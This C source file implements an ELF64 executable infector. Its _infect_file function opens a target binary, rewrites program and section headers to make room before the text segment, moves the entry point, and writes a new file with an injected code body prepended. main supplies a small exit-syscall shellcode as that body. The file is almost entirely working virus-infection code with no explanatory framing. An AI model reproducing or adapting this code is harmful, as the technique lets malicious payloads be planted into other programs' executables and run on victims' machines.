#include <elf.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#include <stdio.h>
#include <inttypes.h>

#define PAGE_SIZE 4096
#define PAGE_ROUND(arg) ((arg) % PAGE_SIZE ? 				\
			 ((arg) / PAGE_SIZE + 1) * PAGE_SIZE : (arg))


#define _syscall_wrap(num, ...) syscall(num, __VA_ARGS__)

/*
long _syscall_wrap(long number, ...)
{
	long resultvar;
	asm volatile (
	"movq %%rsi, 	%%rdi	\n\t"
	"movq %%rdx, 	%%rsi	\n\t"
	"movq %%rcx, 	%%rdx	\n\t"
	"movq %%r8, 	%%r10	\n\t"
	"movq %%r9, 	%%r8	\n\t"
	"movq 8(%%rsp),	%%r9	\n\t"
	"syscall		\n\t"
	: "=a" (resultvar)
	: "rax" (number)
	: "memory", "cc", "r11", "cx", "rdi", "rsi", "rdx", "r10", "r8", "r9");
	return resultvar;
}
*/

int _infect_file(const char *target_path, void *body, size_t body_s)
{
	/* Open, mmap */
	int target_fd = _syscall_wrap(SYS_open, target_path, O_RDWR);
	if (target_fd == -1)
		return -1;
	struct stat statbuf;
	if (_syscall_wrap(SYS_fstat, target_fd, &statbuf) == -1)
		return -1;
	char *mem = (void*) _syscall_wrap(SYS_mmap, NULL, statbuf.st_size,
			          PROT_READ | PROT_WRITE, MAP_PRIVATE,
				  target_fd, 0);
	if (mem == MAP_FAILED) {
		_syscall_wrap(SYS_exit, 15);
		return -1;
	}

	Elf64_Ehdr *e_hdr = (Elf64_Ehdr*) mem;
	
	/* Check elf exec */
	if (e_hdr->e_ident[EI_MAG0]  	^ ELFMAG0 	|
	    e_hdr->e_ident[EI_MAG1]  	^ ELFMAG1 	|
	    e_hdr->e_ident[EI_MAG2]  	^ ELFMAG2 	|
	    e_hdr->e_ident[EI_MAG3]  	^ ELFMAG3	|
	    e_hdr->e_ident[EI_CLASS] 	^ ELFCLASS64)
		return -1;

	Elf64_Phdr *p_hdr_beg = (Elf64_Phdr*) (mem + e_hdr->e_phoff);
	Elf64_Phdr *p_hdr_end = p_hdr_beg + e_hdr->e_phnum;
	Elf64_Off text_p_offset;

/* Playing with load0 and load2 segments */
////////////////////////////////////////////////////////////
	p_hdr_beg[2].p_filesz 	= 0;
	p_hdr_beg[2].p_memsz  	= 0;
	p_hdr_beg[2].p_offset	= -PAGE_SIZE; // 0
	
	p_hdr_beg[2].p_vaddr 	= 0;
	p_hdr_beg[2].p_paddr 	= 0;

	p_hdr_beg[3].p_filesz 	+= PAGE_SIZE;
	p_hdr_beg[3].p_memsz 	+= PAGE_SIZE;
	p_hdr_beg[3].p_offset 	= 0;
	p_hdr_beg[3].p_vaddr 	= 0;
	p_hdr_beg[3].p_paddr	= 0;
////////////////////////////////////////////////////////////

	/* Find text segment */
	for (Elf64_Phdr *p_hdr = p_hdr_beg; p_hdr < p_hdr_end; p_hdr++) {
		if (p_hdr->p_type  == PT_LOAD && 
		    p_hdr->p_flags == (PF_R | PF_X)) {
			p_hdr->p_vaddr  -= PAGE_ROUND(body_s);
			p_hdr->p_paddr  -= PAGE_ROUND(body_s);
			p_hdr->p_filesz += PAGE_ROUND(body_s);
			p_hdr->p_memsz  += PAGE_ROUND(body_s);
			//e_hdr->e_entry  = p_hdr->p_vaddr + sizeof(*e_hdr);
			e_hdr->e_entry += PAGE_ROUND(body_s);
			text_p_offset = p_hdr->p_offset;


			char msg = '\n';
			_syscall_wrap(SYS_write, STDOUT_FILENO, &msg, 1);
		} else
			p_hdr->p_offset += PAGE_ROUND(body_s);
	}
	
	/* Shift sh_offset of every section */
	Elf64_Shdr *s_hdr = (Elf64_Shdr*) (mem + e_hdr->e_shoff);
	for (uint16_t i = e_hdr->e_shnum; i > 0; i--, s_hdr++)
		s_hdr->sh_offset += PAGE_ROUND(body_s);

	e_hdr->e_phoff += PAGE_ROUND(body_s);
	e_hdr->e_shoff += PAGE_ROUND(body_s);

	//e_hdr->e_ehsize += PAGE_ROUND(body_s);

	_syscall_wrap(SYS_close, target_fd);

	int out_fd = _syscall_wrap(SYS_creat, "out.out", statbuf.st_mode);

	_syscall_wrap(SYS_write, out_fd, mem, sizeof(*e_hdr));
	_syscall_wrap(SYS_write, out_fd, body, body_s);
	_syscall_wrap(SYS_lseek, out_fd, sizeof(*e_hdr) + PAGE_ROUND(body_s), SEEK_SET);
	_syscall_wrap(SYS_write, out_fd, mem + sizeof(*e_hdr), statbuf.st_size - sizeof(*e_hdr));

	_syscall_wrap(SYS_close, out_fd);

	return 0;
}

int main(int argc, char *argv[])
{
	uint64_t code = 0xdeadbeef;
	char str_exit[] = "\x48\xC7\xC0\x3C\x00\x00\x00\x48\xC7\xC7\x3C\x00\x00\x00\x0F\x05";
	return (int) _infect_file(argv[1], &str_exit, sizeof(str_exit));
}
